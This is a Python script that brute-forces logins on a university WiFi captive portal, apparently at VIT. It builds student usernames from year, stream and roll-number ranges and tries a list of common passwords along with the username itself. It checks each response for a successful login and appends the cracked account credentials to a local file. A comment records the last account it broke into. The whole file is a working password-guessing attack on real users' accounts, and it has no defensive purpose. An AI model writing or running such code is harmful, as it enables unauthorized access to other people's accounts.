import requests
from bs4 import BeautifulSoup
from constants import POST_URL, COOKIE, HEADERS, POSSIBLE_PASSWORDS, YEARS, STREAMS

passwords = {}

def logout():
    r = requests.get(
        "http://phc.prontonetworks.com/cgi-bin/authlogout"
        , headers=HEADERS
    )

def postRequest(username,password):
    
    return (requests.post(
        POST_URL,
        data={ 
            'userId': username, 'password': password, 'serviceName': 'ProntoAuthentication', 'Submit22': "Login", "Cookie": COOKIE
        }
    ))

f = open("passwords.txt", "a")
f.write('\n')

## Last found 18BME0122
for iii in YEARS:
    for ii in STREAMS: 
        for i in range(155,1000):
            logout()
            username = str(iii) + str(ii) + "{:04d}".format(i)
            possible = POSSIBLE_PASSWORDS
            possible.append(username)
            for j in possible:
                # print(i)
                print(username, j)
                r = postRequest(username,j)                
                soup = BeautifulSoup(r.text, 'html.parser').text
                # print( soup[0] )
                try:
                    if( soup[0] == "S" ):            
                        print("Found")
                        passwords[username] = j
                        print(username,j)
                        
                        f.write(str(passwords))
                        logout()
                except:
                    print("Not in VIT WiFi")
                    exit()
                
            possible.remove(username)
f.close()
